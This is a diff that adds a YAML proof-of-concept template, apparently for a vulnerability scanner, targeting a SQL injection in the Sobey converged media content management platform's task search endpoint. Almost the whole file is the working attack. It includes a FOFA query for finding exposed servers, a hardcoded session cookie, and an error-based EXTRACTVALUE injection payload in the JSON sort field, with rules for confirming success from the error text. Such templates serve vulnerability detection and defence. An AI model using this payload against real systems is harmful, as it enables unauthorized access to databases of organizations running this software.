@@ -1,0 +1,22 @@
+id: poc-yaml-sobey-imcmp-search-sqli
+info:
+  name: 索贝融合媒体内容管理平台 search SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Sc-TaskMonitoring/rest/task/search
+  headers:
+    Content-Type: application/json
+    Cookie: token=5ab95532238da1b7d9eb20de7ecef90e; siteCode=S1
+  data: '{"page":1,"search":{"assignedCodes":""},"size":10,"date":{},"sort":{"field":"1
+    AND EXTRACTVALUE(8342,CONCAT(0x7e,md5({{.t1}}),(SELECT (ELT(8342=8342,1))),0x716b706b71,0x7e))","desc":true}}'
+  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,substr(t2,0,31))
+    && contains(body,"java.sql.SQLException")
+transport: http
